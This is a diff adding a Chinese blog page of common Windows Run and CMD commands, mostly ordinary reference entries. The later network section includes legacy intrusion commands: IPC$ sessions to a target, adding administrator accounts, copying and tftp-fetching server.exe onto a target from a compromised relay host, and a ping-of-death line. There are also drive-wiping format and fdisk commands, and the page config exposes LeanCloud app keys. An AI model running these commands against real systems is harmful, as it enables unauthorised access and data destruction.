@@ -1,0 +1,1045 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    
+    
+    <title>Windows常用命令 | yirufeng&#39;s Blog | 未来的小幸运 || 致正在努力的我们 ---- 逸如风</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="keywords" content="CMD">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.css">
+    <link rel="stylesheet" href="/css/style.css?v=1.4.2">
+    
+    <script type="text/javascript">
+        // Data Center
+        var DC = {
+            reward:	true,
+            lv: JSON.parse('{"enable":true,"app_id":"K2RVtHi7RnmoN6dovlDKafn8-gzGzoHsz","app_key":"Qxmil0oqPFdDUyyIp2i1Xikt","icon":true}'),
+            v: JSON.parse('{"enable":false,"appid":"ACuOJIasBeRLiDe2iUApHj67-gzGzoHsz","appkey":"qbgg4tClrQQmvq8uwlpwA5mA","notify":true,"verify":true,"placeholder":"give me some sugers plz...","avatar":"wavatar"}'),
+            g: JSON.parse('{"enable":false,"lazy":true,"owner":"codefine","repo":"gitment","oauth":{"client_id":null,"client_secret":null},"perPage":10}'),
+            d: JSON.parse('{"app_id":null}')
+        };
+    </script>
+    <script type="text/javascript">
+        window.lazyScripts=[];
+    </script>
+    
+</head>
+
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="">
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap">
+      
+      <img src="/img/brand.jpg" class="brand-bg">
+      
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/1.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">逸如风(yirufeng)</h5>
+          <a href="mailto:yirufeng@foxmail.com" title="yirufeng@foxmail.com" class="mail">
+            
+              <span>y</span>
+            
+              <span>i</span>
+            
+              <span>r</span>
+            
+              <span>u</span>
+            
+              <span>f</span>
+            
+              <span>e</span>
+            
+              <span>n</span>
+            
+              <span>g</span>
+            
+              <span>@</span>
+            
+              <span>f</span>
+            
+              <span>o</span>
+            
+              <span>x</span>
+            
+              <span>m</span>
+            
+              <span>a</span>
+            
+              <span>i</span>
+            
+              <span>l</span>
+            
+              <span>.</span>
+            
+              <span>c</span>
+            
+              <span>o</span>
+            
+              <span>m</span>
+            
+          </a>
+        </hgroup>
+        
+        <ul class="menu-link">
+          
+              <li>
+                <a href="https://github.com/sivanWu0222" target="_blank">
+                  <i class="icon icon-lg icon-github"></i>
+                </a>
+              </li>
+            
+              <li>
+                <a href="https://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&amp;amp;email=xfTz8-Py8-f08vWFtLTrpqqo" target="_blank">
+                  <i class="icon icon-lg icon-envelope"></i>
+                </a>
+              </li>
+            
+        </ul>
+        
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                Home
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Category
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/research"  >
+                <i class="icon icon-lg icon-mortar-board"></i>
+                Research
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tag
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archive
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-user"></i>
+                About
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/open-source"  >
+                <i class="icon icon-lg icon-github"></i>
+                Project
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/demo"  >
+                <i class="icon icon-lg icon-audio-description"></i>
+                Demo
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/wechat-number"  >
+                <i class="icon icon-lg icon-wechat"></i>
+                公众号
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="http://www.sivan.tech/LeetCodeAlgo/" target="_blank" >
+                <i class="icon icon-lg icon-braille"></i>
+                Leetcode
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="http://resume.sivan.tech/" target="_blank" >
+                <i class="icon icon-lg icon-file-pdf-o"></i>
+                Resume
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row clearfix">
+        <a href="javascript:;" class="header-icon pull-left waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">
+            <span>Windows常用命令</span>
+            
+        </div>
+        
+        <a href="javascript:;" id="site_search_btn" class="header-icon pull-right waves-effect waves-circle waves-light">
+            <i class="icon icon-lg icon-search"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+    <img src="/img/s3.jpg" class="header-bg">
+    <div class="container fade-scale">
+        <h1 class="title">Windows常用命令</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2016-12-25T02:56:07.000Z" itemprop="datePublished" class="page-time">
+  2016-12-25
+</time>
+
+
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/常用命令/">常用命令</a></li></ul>
+
+            
+        </h5>
+        
+    </div>
+    
+
+</header>
+
+<div id="site_search">
+    <div class="search-title clearfix">
+        <span class="pull-left">
+          <i class="icon icon-lg icon-search"></i>
+        </span>
+        <input type="text" id="local-search-input" name="q" results="0" placeholder="search my blog..." class="form-control pull-left"/>
+        <a href="javascript:;" class="close pull-right waves-effect waves-circle waves-light">
+          <i class="icon icon-lg icon-close"></i>
+        </a>
+    </div>
+    <div id="local-search-result"></div>
+</div>
+
+
+<div class="container body-wrap">
+    <article id="post-Windows常用命令"
+  class="post-article article-type-post" itemprop="blogPost">
+    <div class="post-card">
+        <h1 class="post-card-title">Windows常用命令</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2016-12-25 10:56:07" datetime="2016-12-25T02:56:07.000Z"  itemprop="datePublished">2016-12-25</time>
+
+            
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/常用命令/">常用命令</a></li></ul>
+
+
+
+            
+	<span id="/2016/12/25/Windows常用命令/" class="leancloud_visitors" data-flag-title="Windows常用命令" title="Windows常用命令">
+		
+			<i class="icon icon-eye"></i>
+		
+		<span class="leancloud-visitors-count"></span>
+	</span>
+ 
+
+            
+
+
+            
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            
+            <h2 id="CMD命令："><a href="#CMD命令：" class="headerlink" title="CMD命令："></a>CMD命令：</h2><blockquote>
+<p>开始－&gt;运行－&gt;键入cmd或command（在命令行里可以看到系统版本、文件系统版本）</p>
+</blockquote>
+<ul>
+<li>appwiz.cpl：程序和功能</li>
+<li>calc：启动计算器</li>
+<li>certmgr.msc：证书管理实用程序</li>
+<li>charmap：启动字符映射表</li>
+<li>chkdsk.exe：Chkdsk磁盘检查（管理员身份运行命令提示符）</li>
+<li>cleanmgr: 打开磁盘清理工具</li>
+<li>cliconfg：SQL SERVER 客户端网络实用工具</li>
+<li>cmstp：连接管理器配置文件安装程序</li>
+<li>cmd.exe：CMD命令提示符</li>
+</ul>
+<a id="more"></a>
+<h3 id="自动关机命令"><a href="#自动关机命令" class="headerlink" title="自动关机命令"></a>自动关机命令</h3><ul>
+<li>Shutdown -s -t 600：表示600秒后自动关机</li>
+<li>shutdown -a ：可取消定时关机</li>
+<li>Shutdown -r -t 600：表示600秒后自动重启</li>
+</ul>
+<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>rundll32 user32.dll,LockWorkStation：表示锁定计算机</p>
+<p>colorcpl：颜色管理，配置显示器和打印机等中的色彩</p>
+<p>CompMgmtLauncher：计算机管理</p>
+<p>compmgmt.msc：计算机管理</p>
+<p>credwiz：备份或还原储存的用户名和密码</p>
+<p>comexp.msc：打开系统组件服务</p>
+<p>control：控制面版</p>
+<p>dcomcnfg：打开系统组件服务</p>
+<p>Dccw：显示颜色校准</p>
+<p>devmgmt.msc：设备管理器</p>
+<p>desk.cpl：屏幕分辨率</p>
+<p>dfrgui：优化驱动器 Windows 7→dfrg.msc：磁盘碎片整理程序</p>
+<p>dialer：电话拨号程序</p>
+<p>diskmgmt.msc：磁盘管理</p>
+<p>dvdplay：DVD播放器</p>
+<p>dxdiag：检查DirectX信息</p>
+<p>eudcedit：造字程序</p>
+<p>eventvwr：事件查看器</p>
+<p>explorer：打开资源管理器</p>
+<p>Firewall.cpl：Windows防火墙</p>
+<p>FXSCOVER：传真封面编辑器</p>
+<p>fsmgmt.msc：共享文件夹管理器</p>
+<p>gpedit.msc：组策略</p>
+<p>hdwwiz.cpl：设备管理器</p>
+<p>inetcpl.cpl：Internet属性</p>
+<p>intl.cpl：区域</p>
+<p>iexpress：木马捆绑工具，系统自带</p>
+<p>joy.cpl：游戏控制器</p>
+<p>logoff：注销命令</p>
+<p>lusrmgr.msc：本地用户和组</p>
+<p>lpksetup：语言包安装/删除向导，安装向导会提示下载语言包</p>
+<p>lusrmgr.msc：本机用户和组</p>
+<p>main.cpl：鼠标属性</p>
+<p>mmsys.cpl：声音</p>
+<p>magnify：放大镜实用程序</p>
+<p>mem.exe：显示内存使用情况（如果直接运行无效，可以先管理员身份运行命令提示符，在命令提示符里输入mem.exe&gt;d:a.txt 即可打开d盘查看a.txt，里面的就是内存使用情况了。当然什么盘什么文件名可自己决定。）</p>
+<p>MdSched:Windows内存诊断程序</p>
+<p>mmc：打开控制台</p>
+<p>mobsync：同步命令</p>
+<p>mplayer2：简易widnows media player</p>
+<p>Msconfig.exe：系统配置实用程序<br>msdt：微软支持诊断工具</p>
+<p>msinfo32：系统信息</p>
+<p>mspaint：画图</p>
+<p>Msra：Windows远程协助</p>
+<p>mstsc：远程桌面连接</p>
+<p>NAPCLCFG.MSC：客户端配置</p>
+<p>ncpa.cpl：网络连接</p>
+<p>narrator：屏幕“讲述人”</p>
+<p>Netplwiz：高级用户帐户控制面板，设置登陆安全相关的选项</p>
+<p>netstat : an(TC)命令检查接口</p>
+<p>notepad：打开记事本</p>
+<p>Nslookup：IP地址侦测器</p>
+<p>odbcad32：ODBC数据源管理器</p>
+<p>OptionalFeatures：打开“打开或关闭Windows功能”对话框</p>
+<p>osk：打开屏幕键盘</p>
+<p>perfmon.msc：计算机性能监测器</p>
+<p>perfmon：计算机性能监测器</p>
+<p>PowerShell：提供强大远程处理能力</p>
+<p>printmanagement.msc：打印管理</p>
+<p>powercfg.cpl：电源选项</p>
+<p>psr：问题步骤记录器</p>
+<p>Rasphone：网络连接</p>
+<p>Recdisc：创建系统修复光盘</p>
+<p>Resmon：资源监视器</p>
+<p>Rstrui：系统还原</p>
+<p>regedit.exe：注册表</p>
+<p>regedt32：注册表编辑器</p>
+<p>rsop.msc：组策略结果集</p>
+<p>sdclt：备份状态与配置，就是查看系统是否已备份</p>
+<p>secpol.msc：本地安全策略</p>
+<p>services.msc：本地服务设置</p>
+<p>sfc /scannow：扫描错误并复原/windows文件保护</p>
+<p>sfc.exe：系统文件检查器</p>
+<p>shrpubw：创建共享文件夹</p>
+<p>sigverif：文件签名验证程序</p>
+<p>slui：Windows激活，查看系统激活信息</p>
+<p>slmgr.vbs -dlv ：显示详细的许可证信息</p>
+<p>　 slmgr.vbs -dli ：显示许可证信息</p>
+<p>　 slmgr.vbs -xpr ：当前许可证截止日期</p>
+<p>　 slmgr.vbs -dti ：显示安装ID 以进行脱机激</p>
+<p>　 slmgr.vbs -ipk ：(Product Key)安装产品密钥</p>
+<p>　 slmgr.vbs -ato ：激活Windows</p>
+<p>　 slmgr.vbs -cpky ：从注册表中清除产品密钥（防止泄露引起的攻击）</p>
+<p>　 slmgr.vbs -ilc ：(License file)安装许可证</p>
+<p>　 slmgr.vbs -upk ：卸载产品密钥</p>
+<p>　 slmgr.vbs -skms ：(name[ort] )批量授权</p>
+<p>snippingtool：截图工具，支持无规则截图</p>
+<p>soundrecorder：录音机，没有录音时间的限制</p>
+<p>StikyNot：便笺</p>
+<p>sysdm.cpl：系统属性</p>
+<p>sysedit：系统配置编辑器</p>
+<p>syskey：系统加密，一旦加密就不能解开，保护系统的双重密码</p>
+<p>taskmgr：任务管理器（旧版）</p>
+<p>TM任务管理器（新版）</p>
+<p>taskschd.msc：任务计划程序</p>
+<p>timedate.cpl：日期和时间</p>
+<p>UserAccountControlSettings用户账户控制设置</p>
+<p>utilman：辅助工具管理器</p>
+<p>wf.msc：高级安全Windows防火墙</p>
+<p>WFS：Windows传真和扫描</p>
+<p>wiaacmgr：扫描仪和照相机向导</p>
+<p>winver：关于Windows</p>
+<p>wmimgmt.msc：打开windows管理体系结构(WMI)</p>
+<p>write：写字板</p>
+<p>wscui.cpl：操作中心</p>
+<p>wscript：windows脚本宿主设置</p>
+<p>wuapp：Windows更新</p>
+<p>gpedit.msc—–组策略</p>
+<p>sndrec32——-录音机</p>
+<p>Nslookup——-IP地址侦测器 ，是一个 监测网络中 DNS 服务器是否能正确实现域名解析的命令行工具。 它在 Windows NT/2000/XP 中均可使用 , 但在 Windows 98 中却没有集成这一个工具。</p>
+<p>explorer——-打开资源管理器</p>
+<p>logoff———注销命令</p>
+<p>shutdown——-60秒倒计时关机命令</p>
+<p>lusrmgr.msc—-本机用户和组</p>
+<p>services.msc—本地服务设置</p>
+<p>oobe/msoobe /a—-检查XP是否激活</p>
+<p>notepad——–打开记事本</p>
+<p>cleanmgr——-垃圾整理</p>
+<p>net start messenger—-开始信使服务</p>
+<p>compmgmt.msc—计算机管理</p>
+<p>net stop messenger—–停止信使服务</p>
+<p>conf———–启动netmeeting</p>
+<p>dvdplay——–DVD播放器</p>
+<p>charmap——–启动字符映射表</p>
+<p>diskmgmt.msc—磁盘管理实用程序</p>
+<p>calc———–启动计算器</p>
+<p>dfrg.msc——-磁盘碎片整理程序</p>
+<p>chkdsk.exe—–Chkdsk磁盘检查</p>
+<p>devmgmt.msc— 设备管理器</p>
+<p>regsvr32 /u *.dll—-停止dll文件运行</p>
+<p>drwtsn32—— 系统医生</p>
+<p>rononce -p—-15秒关机</p>
+<p>dxdiag———检查DirectX信息</p>
+<p>regedt32——-注册表编辑器</p>
+<p>Msconfig.exe—系统配置实用程序</p>
+<p>rsop.msc——-组策略结果集</p>
+<p>mem.exe——–显示内存使用情况</p>
+<p>regedit.exe—-注册表</p>
+<p>winchat——–XP自带局域网聊天</p>
+<p>progman——–程序管理器</p>
+<p>winmsd———系统信息</p>
+<p>perfmon.msc—-计算机性能监测程序</p>
+<p>winver———检查Windows版本</p>
+<p>sfc /scannow—–扫描错误并复原</p>
+<p>taskmgr—–任务管理器（2000/xp/2003</p>
+<p>winver———检查Windows版本</p>
+<p>wmimgmt.msc—-打开windows管理体系结构(WMI)</p>
+<p>wupdmgr——–windows更新程序</p>
+<p>wscript——–windows脚本宿主设置</p>
+<p>write———-写字板</p>
+<p>winmsd———系统信息</p>
+<p>wiaacmgr——-扫描仪和照相机向导</p>
+<p>winchat——–XP自带局域网聊天</p>
+<p>mem.exe——–显示内存使用情况</p>
+<p>Msconfig.exe—系统配置实用程序</p>
+<p>mplayer2——-简易widnows media player</p>
+<p>mspaint——–画图板</p>
+<p>mstsc———-远程桌面连接</p>
+<p>mplayer2——-媒体播放机</p>
+<p>magnify——–放大镜实用程序</p>
+<p>mmc————打开控制台</p>
+<p>mobsync——–同步命令</p>
+<p>dxdiag———检查DirectX信息</p>
+<p>iexpress——-木马捆绑工具，系统自带 58. fsmgmt.msc—–共享文件夹管理器</p>
+<p>utilman——–辅助工具管理器</p>
+<p>diskmgmt.msc—磁盘管理实用程序</p>
+<p>dcomcnfg——-打开系统组件服务</p>
+<p>ddeshare——-打开DDE共享设置</p>
+<p>osk————打开屏幕键盘</p>
+<p>odbcad32——-ODBC数据源管理器</p>
+<p>oobe/msoobe /a—-检查XP是否激活 114. logoff———注销命令</p>
+<p>notepad——–打开记事本</p>
+<p>nslookup——-网络管理的工具向导</p>
+<p>ntbackup——-系统备份和还原</p>
+<p>narrator——-屏幕“讲述人”</p>
+<p>ntmsmgr.msc—-移动存储管理器</p>
+<p>ntmsoprq.msc—移动存储管理员操作请求</p>
+<p>netstat -an—-(TC)命令检查接口</p>
+<p>syncapp——–创建一个公文包</p>
+<p>sysedit——–系统配置编辑器</p>
+<p>sigverif——-文件签名验证程序</p>
+<p>ciadv.msc——索引服务程序</p>
+<p>shrpubw——–创建共享文件夹</p>
+<p>secpol.msc—–本地安全策略</p>
+<p>syskey———系统加密，一旦加密就不能解开，保护windows xp系统的双重密码</p>
+<p>services.msc—本地服务设置</p>
+<p>Sndvol32——-音量控制程序</p>
+<p>sfc.exe——–系统文件检查器</p>
+<p>sfc /scannow—windows文件保护</p>
+<p>ciadv.msc——索引服务程序</p>
+<p>tourstart——xp简介（安装完成后出现的漫游xp程序）</p>
+<p>taskmgr——–任务管理器</p>
+<p>eventvwr——-事件查看器</p>
+<p>eudcedit——-造字程序</p>
+<p>compmgmt.msc—计算机管理</p>
+<p>packager——-对象包装程序</p>
+<p>perfmon.msc—-计算机性能监测程序</p>
+<p>charmap——–启动字符映射表</p>
+<p>cliconfg——-SQL SERVER 客户端网络实用程序</p>
+<p>Clipbrd——–剪贴板查看器</p>
+<p>conf———–启动netmeeting</p>
+<p>certmgr.msc—-证书管理实用程序</p>
+<p>regsvr32 /u *.dll—-停止dll文件运行</p>
+<p>regsvr32 /u zipfldr.dll——取消ZIP支持</p>
+<p>cmd.exe——–CMD命令提示符</p>
+<p>chkdsk.exe—–Chkdsk磁盘检查</p>
+<hr>
+<h3 id="基本的操作命令："><a href="#基本的操作命令：" class="headerlink" title="基本的操作命令："></a>基本的操作命令：</h3><h4 id="磁盘操作"><a href="#磁盘操作" class="headerlink" title="磁盘操作"></a>磁盘操作</h4><p>　　fdisk 隐含 参数 /mbr 重建主引导记录fdisk /mbr 重建主引导记录</p>
+<p>　　fdisk 在DOS7.0以后增加了/cmbr参数，可在挂接多个物理硬盘时，重建排序在后面的硬盘的主引导记录，例如：fdisk /cmbr 2，可重写第二个硬盘的主引导记录。（在使用时要十分小心，避免把好的硬盘引导记录损坏）</p>
+<p>　　format 参数： /q 快速格式化 /u 不可恢复 /autotest 不提示 /s 创建 MS-DOS 引导盘 format c: /q /u /autotest</p>
+<hr>
+<h3 id="目录操作"><a href="#目录操作" class="headerlink" title="目录操作"></a>目录操作</h3><ul>
+<li><p>DIR [目录名或文件名] [/S][/W][/P][/A] 列出目录 参数: /s 查找子目录/w 只显示文件名 /p 分页/a 显示隐藏文件 DIR format.exe /s查找该盘的format.exe文件并报告位置</p>
+</li>
+<li><p>MD (MKDIR) [目录名] 创建目录 MKDIR HELLOWORLD 创建HELLOWORLD目录</p>
+</li>
+<li><p>CD (CHDIR) [目录名] PS:可以使用相对目录或绝对目录 进入目录 CD AA 进入当前文件夹下的AA目录,cd .. 进入上一个文件夹cd \返回根目录;cd c:\windows 进入c:\windows文件夹</p>
+</li>
+<li><p>RD ( RMDIR) [目录名] 删除目录 RD HELLOWORLD 删除HELLOWORLD目录</p>
+</li>
+</ul>
+<hr>
+<h3 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h3><ul>
+<li><p>删除目录及其文件： rmdir [目录名或文件名] [/S][/W][/P][/A] 。例 rmdir c:\qqdownload/s 删除C盘的qqdownload目录。</p>
+</li>
+<li><p>del [目录名或文件名] [/f][/s][/q] 删除 参数:/f 删除只读文件/s 删除该目录及其下的所有内容 /q 删除前不确认</p>
+</li>
+<li><p>del c:\del /s /q 自动删除c盘的del目录。</p>
+</li>
+<li><p>copy [源文件或目录] [目标目录] 复制文件 copy d:\pwin98<em>.</em> c:\presetup 将d盘的pwin98的所有文件复制到c盘的presetup下。</p>
+</li>
+<li><p>attrib [参数][源文件或目录] 文件属性操作命令，attrib命令可以列出或修改磁盘上文件的属性，文件属性包括文档（A）、只读(R)、隐藏(H)、系统(S)，例如：attrib -h -r -s io.sys 执行这一命令后，将把DOS系统文件io.sys文件的只读、隐藏、系统属性去掉，这时将可以直接通过dir命令看到io.sys文件。attrib +h +r +s autoexec.bat将为自动批处理文件增加以上属性。</p>
+</li>
+</ul>
+<hr>
+<h3 id="内存操作"><a href="#内存操作" class="headerlink" title="内存操作"></a>内存操作</h3><ul>
+<li><p>debug 调试内存 参数 -w [文件名] 写入二进制文件 -o [地址1] [地址2] 输出内存 -q 退出 exp:o 70 10[return] o 71 01</p>
+</li>
+<li><p>[return] 01[return] q[return] DOS下通过写70h/71h PORT改变BIOS密码在CMOS中存放的对应位置的值,用以清除AWARD BIOS密码.debug 还可以破解硬盘保护卡等,但只可以在纯DOS下用。</p>
+</li>
+</ul>
+<hr>
+<h3 id="分区操作"><a href="#分区操作" class="headerlink" title="分区操作"></a>分区操作</h3><blockquote>
+<p>给磁盘分区，一般都会分成四个区，磁盘分区由主分区、扩展分区、逻辑分区组成。</p>
+</blockquote>
+<p>PQ和Acronis Disk Director这两个工具都可以在不丢失数据的情况下对分区进行调整大小，以及合并等操作，XP系统的话你用PQ，WIN7系统的话用Acronis Disk Director 操作基本一样，可以去网上找教程来看看，再不重装系统的情况下都能调整分区大小，但是建议你还是先备份下数据再调整，毕竟对硬盘直接进行的操作有一定的危险性。</p>
+<p>　　net use ipipc$ “ “ /user:” “ 建立IPC空链接</p>
+<p>　　net use ipipc$ “密码” /user:”用户名” 建立IPC非空链接</p>
+<p>　　net use h: ipc$ “密码” /user:”用户名” 直接登陆后映射对方C：到本地为H:</p>
+<p>　　net use h: ipc$ 登陆后映射对方C：到本地为H:</p>
+<p>　　net use ipipc$ /del 删除IPC链接</p>
+<p>　　net use h: /del 删除映射对方到本地的为H:的映射</p>
+<p>　　net user 用户名　密码　/add 建立用户</p>
+<p>　　net user guest /active:yes 激活guest用户</p>
+<p>　　net user 查看有哪些用户</p>
+<p>　　net user 帐户名 查看帐户的属性</p>
+<p>　　net localgroup administrators 用户名 /add 把“用户”添加到管理员中使其具有管理员权限</p>
+<p>　　net start 查看开启了哪些服务</p>
+<p>　　net start 服务名　开启服务；(如:net start telnet， net start schedule)</p>
+<p>　　net stop 服务名 停止某服务</p>
+<p>　　net time 目标ip 查看对方时间</p>
+<p>　　net time 目标ip /set 设置本地计算机时间与“目标IP”主机的时间同步,加上参数/yes可取消确认信息</p>
+<p>　　net view 查看本地局域网内开启了哪些共享</p>
+<p>　　net view ip 查看对方局域网内开启了哪些共享</p>
+<p>　　net config 显示系统网络设置</p>
+<p>　　net logoff 断开连接的共享</p>
+<p>　　net pause 服务名 暂停某服务</p>
+<p>　　net send ip “文本信息” 向对方发信息</p>
+<p>　　net ver 局域网内正在使用的网络连接类型和信息</p>
+<p>　　net share 查看本地开启的共享</p>
+<p>　　net share ipc开启ipc共享</p>
+<p>　　net share ipc/del删除ipc共享</p>
+<p>　　net share c$ /del 删除C：共享</p>
+<p>　　net user guest 12345 用guest用户登陆后用将密码改为12345</p>
+<p>　　net password 密码 更改系统登陆密码</p>
+<p>　　netstat -a 查看开启了哪些端口,常用netstat -an</p>
+<p>　　netstat -n 查看端口的网络连接情况，常用netstat -an</p>
+<p>　　netstat -v 查看正在进行的工作</p>
+<p>　　netstat -p 协议名 例：netstat -p tcq/ip 查看某协议使用情况</p>
+<p>　　netstat -s 查看正在使用的所有协议使用情况</p>
+<p>　　nbtstat -A ip 对方136到139其中一个端口开了的话，就可查看对方最近登陆的用户名</p>
+<p>　　tracert -参数 ip(或计算机名) 跟踪路由（数据包），参数：“-w数字”用于设置超时间隔。</p>
+<p>　　ping ip(或域名) 向对方主机发送默认大小为32字节的数据，参数：“-l[空格]数据包大小”；“-n发送数据次数”；“-t”指一直ping。</p>
+<p>　　ping -t -l 65550 ip 死亡之ping(发送大于64K的文件并一直ping就成了死亡之ping)</p>
+<p>　　ipconfig (winipcfg) 用于windows NT及XP(windows 95 98)查看本地ip地址，ipconfig可用参数“/all”显示全部配置信息</p>
+<p>　　tlist -t 以树行列表显示进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内)</p>
+<p>　　kill -F 进程名 加-F参数后强制结束某进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内)</p>
+<p>　　del -F 文件名 加-F参数后就可删除只读文件,/AR、/AH、/AS、/AA分别表示删除只读、隐藏、系统、存档文件，/A-R、/A-H、/A-S、/A-A表示删除除只读、隐藏、系统、存档以外的文件。例如“DEL/AR .”表示删除当前目录下所有只读文件，“DEL/A-S .”表示删除当前目录下除系统文件以外的所有文件</p>
+<p>　　del /S /Q 目录 或用：rmdir /s /Q 目录 /S删除目录及目录下的所有子目录和文件。同时使用参数/Q 可取消删除操作时的系统确认就直接删除。（二个命令作用相同）</p>
+<p>　　move 盘符路径要移动的文件名　存放移动文件的路径移动后文件名 移动文件,用参数/y将取消确认移动目录存在相同文件的提示就直接覆盖</p>
+<p>　　fc one.txt two.txt &gt; 3st.txt 对比二个文件并把不同之处输出到3st.txt文件中，”&gt; “和”&gt; &gt;” 是重定向命令</p>
+<p>　　at id号 开启已注册的某个计划任务</p>
+<p>　　at /delete 停止所有计划任务，用参数/yes则不需要确认就直接停止</p>
+<p>　　at id号 /delete 停止某个已注册的计划任务</p>
+<p>　　at 查看所有的计划任务</p>
+<p>　　at ip time 程序名(或一个命令) /r 在某时间运行对方某程序并重新启动计算机</p>
+<p>　　finger username @host 查看最近有哪些用户登陆</p>
+<p>　　telnet ip 端口 远和登陆服务器,默认端口为23</p>
+<p>　　open ip 连接到IP（属telnet登陆后的命令）</p>
+<p>　　telnet 在本机上直接键入telnet 将进入本机的telnet</p>
+<p>　　copy 路径文件名1　路径文件名2 /y 复制文件1到指定的目录为文件2，用参数/y就同时取消确认你要改写一份现存目录文件</p>
+<p>　　copy c:srv.exe ipadmin$ 复制本地c:srv.exe到对方的admin下</p>
+<p>　　copy 1st.jpg/b+2st.txt/a 3st.jpg 将2st.txt的内容藏身到1st.jpg中生成3st.jpg新的文件，注：2st.txt文件头要空三排，参数：/b指二进制文件，/a指ASCLL格式文件</p>
+<p>　　copy ipadminsvv.exec:或:copyipadmin. 复制对方admini$共享下的srv.exe文件（所有文件）至本地C：</p>
+<p>　　xcopy 要复制的文件或目录树　目标地址目录名 复制文件和目录树，用参数/Y将不提示覆盖相同文件</p>
+<p>　　用参数/e才可连目录下的子目录一起复制到目标地址下。</p>
+<p>　　tftp -i 自己IP(用肉机作跳板时这用肉机IP) get server.exec:server.exe 登陆后，将“IP”的server.exe下载到目标主机c:server.exe 参数：-i指以二进制模式传送，如传送exe文件时用，如不加-i 则以ASCII模式（传送文本文件模式）进行传送</p>
+<p>　　tftp -i 对方IP　put c:server.exe 登陆后，上传本地c:server.exe至主机</p>
+<p>　　ftp ip 端口 用于上传文件至服务器或进行文件操作，默认端口为21。bin指用二进制方式传送（可执行文件进）；默认为ASCII格式传送(文本文件时)</p>
+<p>　　route print 显示出IP路由，将主要显示网络地址Network addres，子网掩码Netmask，网关地址Gateway addres，接口地址Interface</p>
+<p>　　arp 查看和处理ARP缓存，ARP是名字解析的意思，负责把一个IP解析成一个物理性的MAC地址。arp -a将显示出全部信息</p>
+<p>　　start 程序名或命令 /max 或/min 新开一个新窗口并最大化（最小化）运行某程序或命令</p>
+<p>　　mem 查看cpu使用情况</p>
+<p>　　attrib 文件名(目录名) 查看某文件（目录）的属性</p>
+<p>　　attrib 文件名 -A -R -S -H 或 +A +R +S +H 去掉(添加)某文件的 存档，只读，系统，隐藏 属性；用+则是添加为某属性</p>
+<p>　　dir 查看文件，参数：/Q显示文件及目录属系统哪个用户，/T:C显示文件创建时间，/T:A显示文件上次被访问时间，/T:W上次被修改时间</p>
+<p>　　date /t 、 time /t 使用此参数即“DATE/T”、“TIME/T”将只显示当前日期和时间，而不必输入新日期和时间</p>
+<p>　　set 指定环境变量名称=要指派给变量的字符 设置环境变量</p>
+<p>　　set 显示当前所有的环境变量</p>
+<p>　　set p(或其它字符) 显示出当前以字符p(或其它字符)开头的所有环境变量</p>
+<p>　　pause 暂停批处理程序，并显示出：请按任意键继续….</p>
+<p>　　if 在批处理程序中执行条件处理（更多说明见if命令及变量）</p>
+<p>　　goto 标签 将cmd.exe导向到批处理程序中带标签的行（标签必须单独一行，且以冒号打头，例如：“：start”标签）</p>
+<p>　　call 路径批处理文件名 从批处理程序中调用另一个批处理程序 （更多说明见call /?）</p>
+<p>　　for 对一组文件中的每一个文件执行某个特定命令（更多说明见for命令及变量）</p>
+<p>　　echo on或off 打开或关闭echo，仅用echo不加参数则显示当前echo设置</p>
+<p>　　echo 信息 在屏幕上显示出信息</p>
+<p>　　echo 信息 &gt;&gt; pass.txt 将”信息”保存到pass.txt文件中</p>
+<p>　　findstr “Hello” aa.txt 在aa.txt文件中寻找字符串hello</p>
+<p>　　find 文件名 查找某文件</p>
+<p>　　title 标题名字 更改CMD窗口标题名字</p>
+<p>　　color 颜色值 设置cmd控制台前景和背景颜色；0=黑、1=蓝、2=绿、3=浅绿、4=红、5=紫、6=黄、7=白、8=灰、9=淡蓝、A=淡绿、B=淡浅绿、C=淡红、D=淡紫、E=淡黄、F=亮白</p>
+<p>　　prompt 名称 更改cmd.exe的显示的命令提示符(把C:、D:统一改为：EntSky )</p>
